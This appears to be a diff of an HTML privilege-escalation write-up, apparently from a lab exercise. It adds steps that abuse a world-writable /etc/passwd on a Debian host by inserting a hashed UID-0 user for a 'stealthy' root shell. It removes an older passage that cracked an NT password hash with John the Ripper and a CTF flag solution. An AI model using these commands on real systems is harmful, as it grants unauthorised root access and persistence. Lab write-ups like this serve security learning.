@@ -139,39 +139,26 @@ root</code></pre>
             <section id="Four">
                 <h2>Writeable /etc/passwd</h2>
                 <p>Again, a very similar techinque to the last two. In this case, we discover that we can write to the file "/etc/passwd".</p>
-
-                
-                <p>Firstly save the hash for user Jon to a text file. Then pass the hash to JTR.</p>
-                <pre><code>case@local:~/src/john/run$ ./john --format=NT --fork=8 --wordlist=/usr/share/wordlists/rockyou.txt jon_hash.txt</code></pre>
-                <p>We now have user "Jon's" password.</p>
-                <pre><code>Using default input encoding: UTF-8
-Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
-Node numbers 1-8 of 8 (fork)
-Note: Passwords longer than 27 rejected
-Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
-alq.......... (?)</code></pre>
-                <p>I have not actually shown the password, do it yourself!</p>
+                <pre><code>user@debian:~$ ls -l /etc/passwd
+-rw-r--rw- 1 root root 1009 Aug 25 2019 /etc/passwd</code></pre>
+                <p>This is pretty straight forward, we can simply replace the "x" password placeholder with a hash of our own for the root user. Or, we could add our own root user with a different user name. The latter is likely the better option as it is slightly more stealthy, as it does not disrupt the functionality of the existing root user. Generate a new password hash with password of your choice:</p>
+                <pre><code>user@debian:~$ openssl passwd naughty
+v.iwn1lhrlTpk</code></pre>
+                <p>Create a new root user, in the /etc/passwd file, like so:</p>
+                <pre><code>newrootuser:v.iwn1lhrlTpk:0:0:root:/root:/bin/bash</code></pre>                
+                <p>Save the file, you can now simply spawn a root shell:</p>
+                <pre><code>user@debian:~$ su newrootuser
+Password:
+root@debian:/home/user# whoami
+root</code></pre>
+                <p><strong>Congratulations, you own the system!</strong></p>
             </section>
-
-            <section id="solution">
-                <h2>Solution</h2>
-                <p>First flag is here:</p>
-                <pre><code>C:\>type flag1.txt
-type flag.txt
-flag{XXXXX}</code></pre>
-                <p>The second flag is here:</p>
-                <pre><code>C:\Windows\System32\config>type flag2.txt
-type flag2.txt
-flag{XXXXX}</code></pre>
-                <p>The final flag is here (make sure you have elevated privileges):</p>
-                <pre><code>C:\Users\Jon\Documents>type flag3.txt
-type flag3.txt
-flag{XXXXX}</code></pre>
+            <section id="Five">
+                <h2>Sudo - Shell Escape Sequences</h2>
             </section>
             
-            <section id="conclusion">
-                <h2>Conclusion</h2>
-                <p>This was my second CTF challenge and I found it a lot more challenging than than the first one I did. However, this was primarily because I did not follow any of the pre-existing write-ups, importantly, I did not utilise Metasploit, which would have made this challenge a darn sight easier. My reason for approaching the challenge in this way is that I want to learn as much as possible. By coming up with my own ideas and approaches and testing them out, I fail more frequently. This is good, as it forces me to read more and understand how things work on a deeper level.</p>
+            <section id="Six">
+                <h2>Sudo - Environment Variables</h2>
             </section>
         </article>
     </main>
